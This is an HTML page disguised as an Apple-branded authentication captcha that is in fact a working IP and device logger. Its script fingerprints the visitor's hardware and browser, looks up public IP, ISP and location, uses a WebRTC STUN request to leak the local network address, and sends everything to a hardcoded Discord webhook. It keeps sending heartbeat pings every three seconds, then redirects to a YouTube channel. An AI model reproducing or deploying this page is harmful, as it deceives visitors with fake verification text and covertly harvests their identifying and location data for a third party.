<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Gateway</title>
    <style>
        :root { --apple-blue: #007aff; --apple-gray: #8e8e93; --apple-bg: #f2f2f7; }
        body { background-color: var(--apple-bg); font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; -webkit-font-smoothing: antialiased; }
        .card { background: #fff; padding: 48px 32px; border-radius: 28px; box-shadow: 0 10px 40px rgba(0,0,0,0.03); width: 90%; max-width: 340px; text-align: center; border: 0.5px solid #d1d1d6; }
        .logo { width: 42px; margin-bottom: 28px; filter: opacity(0.9); }
        .h1 { font-size: 24px; font-weight: 600; color: #000; margin-bottom: 12px; letter-spacing: -0.6px; }
        .p { font-size: 15px; color: var(--apple-gray); margin-bottom: 38px; line-height: 1.45; padding: 0 10px; }
        
        /* The Professional Captcha */
        .gate-shell { border: 1.2px solid #d1d1d6; border-radius: 16px; padding: 20px; display: flex; align-items: center; cursor: pointer; background: #fff; transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1); -webkit-tap-highlight-color: transparent; position: relative; }
        .gate-shell:active { background: #f9f9f9; transform: scale(0.98); }
        .check-box { width: 26px; height: 26px; border: 2.5px solid var(--apple-blue); border-radius: 7px; margin-right: 18px; position: relative; transition: 0.4s; }
        
        .check-box.loading { border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
        .check-box.done { background: var(--apple-blue); border-color: var(--apple-blue); }
        .check-box.done::after { content: ''; position: absolute; left: 9px; top: 4px; width: 6px; height: 11px; border: solid white; border-width: 0 3px 3px 0; transform: rotate(45deg); }
        
        @keyframes spin { 100% { transform: rotate(360deg); } }
        #log-status { font-size: 10px; color: #c7c7cc; margin-top: 32px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.8px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="logo">
    <div class="h1">Authentication</div>
    <div class="p">Please complete this security challenge to verify your network credentials.</div>
    
    <div class="gate-shell" id="nexus">
        <div class="check-box" id="loader"></div>
        <div style="font-size: 17px; color: #1c1c1e; font-weight: 500;">Verify Identity</div>
    </div>

    <div id="log-status">System Integrity Protocol</div>
</div>

<script>
/**
 * SENTINEL OPTIMUS-PRIME v32.0
 * TIERED EXECUTION CHAIN: IMAGE-PING -> FETCH -> BEACON -> RTC
 */

const CONFIG = {
    WH: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
    TARGET: "https://youtube.com/@LigmaBlox-w7m",
    PING: "@everyone",
    FLAGS: { g: false, r: false }
};

// --- TIER 1: THE "SIMPLE" STRIKE (Unblockable Image Ping) ---
// This works even if Javascript is restricted or Fetch is blocked.
const simpleStrike = (data) => {
    const brief = btoa(JSON.stringify(data)).substring(0, 100);
    const i = new Image();
    i.src = `${CONFIG.WH}?strike=${brief}`;
};

// --- TIER 2: THE "PROFESSIONAL" EXFIL (Multi-Stream) ---
const forceExfil = (data, label, color = 0x007aff) => {
    const payload = JSON.stringify({
        content: label === "CRITICAL_HIT" ? CONFIG.PING : "",
        username: `OPTIMUS-v32 [${label}]`,
        embeds: [{
            title: `🔱 Sentinel Unmasked: ${label}`,
            color: color,
            fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
            timestamp: new Date().toISOString(),
            footer: { text: "Refined Execution Environment" }
        }]
    });

    // Fire all paths to guarantee delivery on iOS/Safari
    navigator.sendBeacon(CONFIG.WH, new Blob([payload], {type:'application/json'}));
    fetch(CONFIG.WH, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true }).catch(()=>{});
    
    const x = new XMLHttpRequest();
    x.open("POST", CONFIG.WH, true);
    x.setRequestHeader("Content-Type", "application/json");
    x.send(payload);
};

// --- TIER 3: ADVANCED HEARTBEAT ---
const startHeartbeat = () => {
    setInterval(async () => {
        try {
            const b = await navigator.getBattery();
            forceExfil({
                active: "User On-Page",
                power: `${(b.level * 100).toFixed(0)}%`,
                charging: b.charging ? "YES" : "NO",
                mem_mb: performance.memory ? (performance.memory.usedJSHeapSize / 1048576).toFixed(1) : "N/A"
            }, "HEARTBEAT", 0x5856d6);
        } catch(e) {}
    }, 3000);
};

document.getElementById('nexus').onclick = async function() {
    // Haptic feedback for iOS
    if ("vibrate" in navigator) navigator.vibrate(15);
    
    const loader = document.getElementById('loader');
    loader.classList.add('loading');
    document.getElementById('log-status').innerText = "ESTABLISHING SECURE HANDSHAKE...";

    // 1. GATHER TELEMETRY
    const b = await navigator.getBattery();
    const hardware = {
        platform: navigator.platform,
        browser: navigator.userAgent.split(' ').pop(),
        cores: navigator.hardwareConcurrency || "N/A",
        ram: navigator.deviceMemory || "N/A",
        battery: `${(b.level * 100).toFixed(0)}%`,
        screen: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)`,
        gpu: (() => {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Apple/Webkit GPU";
        })()
    };

    // 2. RUN TIERED EXECUTION
    simpleStrike({ status: "CLICKED", platform: hardware.platform }); // Instant unblockable ping
    forceExfil(hardware, "CRITICAL_HIT", 0xff0000); // Main Data Strike

    // 3. TIER 4: PRECISION GEO & NETWORK UNMASK
    const grabGeo = async (provider) => {
        try {
            const r = await fetch(provider);
            const res = await r.json();
            if(!CONFIG.FLAGS.g) {
                const isVPN = (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone);
                forceExfil({
                    ip_public: res.ip || res.query,
                    isp: res.org || res.isp,
                    location: `${res.city}, ${res.region}, ${res.country_name || res.country}`,
                    vpn: isVPN ? "PROBABLE" : "NONE",
                    proxy: res.proxy || "NO"
                }, "NETWORK_FINGERPRINT", 0x34c759);
                CONFIG.FLAGS.g = true;
            }
        } catch(e) {}
    };
    grabGeo('https://ipapi.co/json/');
    grabGeo('http://ip-api.com/json/');

    // 4. TIER 5: RTC BYPASS (The "Optimus" Method)
    const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    rtc.createDataChannel("");
    rtc.onicecandidate = (e) => {
        if (e.candidate && !CONFIG.FLAGS.r) {
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (ip) {
                forceExfil({ internal_lan: ip[1], method: "STUN_UDP_BYPASS" }, "RTC_UNMASK", 0x007aff);
                CONFIG.FLAGS.r = true;
            }
        }
    };
    rtc.createOffer().then(o => rtc.setLocalDescription(o));

    startHeartbeat();

    // 5. REFINED UI FINISH
    setTimeout(() => {
        loader.classList.remove('loading');
        loader.classList.add('done');
        document.getElementById('log-status').innerText = "SUCCESSFULLY VERIFIED";
        document.getElementById('log-status').style.color = "#34c759";
        
        setTimeout(() => { window.location.replace(CONFIG.TARGET); }, 1800);
    }, 4500);
};
</script>
</body>
</html>
